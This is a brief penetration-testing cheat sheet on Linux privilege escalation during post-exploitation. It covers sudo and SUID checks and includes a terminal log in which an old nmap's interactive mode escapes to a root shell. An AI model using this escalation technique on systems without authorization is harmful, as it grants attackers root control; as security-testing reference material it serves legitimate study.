# LINUX
This sheet serves as a resource for processes commonly used to escalate privileges of a low-privilege user access during the post-exploitation phase of the penetration test.
## SUDO Test
Testing for sudo will sometimes reveal a nice surprise. The LinuxPrivChecker Python script will tell you exactly which commands/programs are installed with interactive shells that can be escaped from. For instance, some older version of `nmap` had a interactivbe shell. This meant that on certain systems in which a default account has non-authenticated sudo access to it, it could easily lead to a root shell.

```
bash-3.2$ ls -lah /usr/bin/nmap
ls -lah /usr/bin/nmap
-rwxr-xr-x 1 root root 523K Jan  6  2007 /usr/bin/nmap
bash-3.2$ sudo nmap --interactive
sudo nmap --interactive

Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> ! /bin/bash
! /bin/bash
bash-3.2# id
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
bash-3.2# 
```
So, it is **very important** that all of these are tested with sudo.
## SUID Test
Some of the aforementioned applciations which can be escaped from may have a SUID bit set in the permissions. This means that the effective user ID becomes that of the file's owner. **Again, test all of these** applications, **without sudo** if the attack above is unsuccessful because some of the file permissions may not be set correctly. You'd be surprised.
